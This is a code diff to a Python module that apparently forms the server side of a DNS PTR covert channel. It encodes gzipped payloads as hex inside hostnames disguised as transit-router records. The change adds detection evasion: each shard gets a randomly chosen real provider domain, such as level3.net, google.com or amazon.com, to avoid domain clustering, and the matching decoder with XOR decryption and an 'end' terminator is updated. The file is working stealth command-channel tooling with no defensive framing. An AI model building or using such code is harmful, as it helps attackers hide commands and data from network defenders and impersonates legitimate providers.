@@ -14,21 +14,32 @@ from server.config import (
     CMD_END, COMPRESS_PAYLOAD, GZIP_MAGIC, STEALTH_RESERVED,
 )
 
-# Realistic transit-router style labels for PTR hostnames (hex is in the middle)
+# Realistic transit-router / switch style labels (Level3, Google, Cisco, Juniper, etc.)
 _PREFIX_LABELS = (
     "ge-0-0-1", "xe-1-2-3", "te-0-1-0", "so-0-0-0", "et-0-0-1",
     "cr1", "cr2", "ar1", "ar2", "edge1", "core1", "gw1", "rtr1",
+    "ae1", "ae2", "bundle-ae1", "ge-1-0-0", "xe-0-0-1", "et-1-0-0",
+    "peer1", "peer2", "transit1", "uplink1", "backbone1",
 )
 _SUFFIX_LABELS = (
     "nyc", "lax", "lhr", "fra", "sin", "syd", "dfw", "ord", "sea", "ams", "iad",
 )
 
+# Randomized TLDs and common transit/switch provider domains (hostname appearance only)
+PTR_DOMAINS = (
+    "level3.net", "level3.com", "lumen.com", "cogentco.com", "he.net",
+    "google.com", "google.net", "nvidia.com", "cloudflare.com", "akamai.net",
+    "ntt.net", "ntt.com", "telia.net", "equinix.com", "amazon.com",
+    "fastly.com", "zayo.com", "centurylink.com", "att.net", "verizon.com",
+    "coloblx.net", "linode.com", "digitalocean.com", "ovh.net",
+)
+_PTR_DOMAIN_SUFFIX_LEN = 1 + max(len(d) for d in PTR_DOMAINS)
 
-def _compute_label_sizes(domain_zone: str, reserved: int = 0) -> list[int]:
+
+def _compute_label_sizes(domain_suffix_len: int, reserved: int = 0) -> list[int]:
     """Calculate how many 63-char labels fit in 253-char FQDN minus domain suffix and reserved.
-    Each label size is forced to be even so hex decoding never drops a half-byte."""
-    suffix_len = len(f".{domain_zone}")
-    available = FQDN_MAX - suffix_len - reserved
+    domain_suffix_len is 1 + len(domain) e.g. for 'level3.net' use 10. Each label size is even."""
+    available = FQDN_MAX - domain_suffix_len - reserved
     labels = []
     remaining = available
     while remaining > 0:
@@ -42,7 +53,7 @@ def _compute_label_sizes(domain_zone: str, reserved: int = 0) -> list[int]:
     return labels
 
 
-LABEL_SIZES = _compute_label_sizes(DOMAIN_ZONE, STEALTH_RESERVED)
+LABEL_SIZES = _compute_label_sizes(_PTR_DOMAIN_SUFFIX_LEN, STEALTH_RESERVED)
 MAX_HEX_PER_HOP = sum(LABEL_SIZES)
 
 # Regex: label is only hex chars and has even length (valid hex bytes)
@@ -68,12 +79,17 @@ def _extract_hex_from_hostname_part(hostname_part: str) -> str:
     return "".join(out)
 
 
+def _random_ptr_domain() -> str:
+    """Pick a random transit/switch-style domain for PTR hostname (TLD randomized)."""
+    return random.choice(PTR_DOMAINS)
+
+
 def encode_payload(payload: bytes) -> list[str]:
     """
     Encode a payload into a list of PTR hostnames (shards) that look like transit routers.
-    If COMPRESS_PAYLOAD is True, gzips payload first so clients that support
-    decompression receive fewer shards.
-    Returns FQDNs like: 'ge-0-0-1.4a6f686e.446f6573.nyc.DOMAIN_ZONE' plus terminator 'end.DOMAIN_ZONE'.
+    Each shard uses a random TLD/domain (level3.net, google.com, etc.) to avoid domain clustering.
+    If COMPRESS_PAYLOAD is True, gzips payload first.
+    Returns FQDNs like: 'ge-0-0-1.4a6f686e.nyc.level3.net' plus terminator 'end.<random_domain>'.
     """
     if COMPRESS_PAYLOAD:
         payload = gzip.compress(payload)
@@ -97,28 +113,29 @@ def encode_payload(payload: bytes) -> list[str]:
 
         prefix = random.choice(_PREFIX_LABELS)
         suffix = random.choice(_SUFFIX_LABELS)
-        hostname = ".".join([prefix] + hex_labels + [suffix]) + f".{DOMAIN_ZONE}"
+        domain = _random_ptr_domain()
+        hostname = ".".join([prefix] + hex_labels + [suffix]) + f".{domain}"
         shards.append(hostname)
 
-    shards.append(f"{CMD_END}.{DOMAIN_ZONE}")
+    shards.append(f"{CMD_END}.{_random_ptr_domain()}")
     return shards
 
 
 def decode_payload(hostnames: list[str]) -> bytes:
     """
     Decode PTR hostnames back into the original payload.
-    Strips the domain suffix, extracts only hex-carrying labels (skips realistic prefix/suffix),
-    concatenates hex, XOR decrypts.
+    PTR hostnames may use any randomized domain (level3.net, google.com, etc.).
+    Stop when a hostname's first label is CMD_END ('end'); otherwise extract hex from full hostname.
     """
-    suffix = f".{DOMAIN_ZONE}"
     hex_parts = []
     for h in hostnames:
-        h = h.rstrip(".")
-        if h.lower() == f"{CMD_END}.{DOMAIN_ZONE}".lower():
+        h = h.rstrip(".").strip()
+        if not h:
+            continue
+        first_label = h.split(".")[0].lower()
+        if first_label == CMD_END.lower():
             break
-        if h.lower().endswith(suffix.lower()):
-            data_part = h[: -len(suffix)]
-            hex_parts.append(_extract_hex_from_hostname_part(data_part))
+        hex_parts.append(_extract_hex_from_hostname_part(h))
 
     hex_str = "".join(hex_parts)
     raw = bytes.fromhex(hex_str)
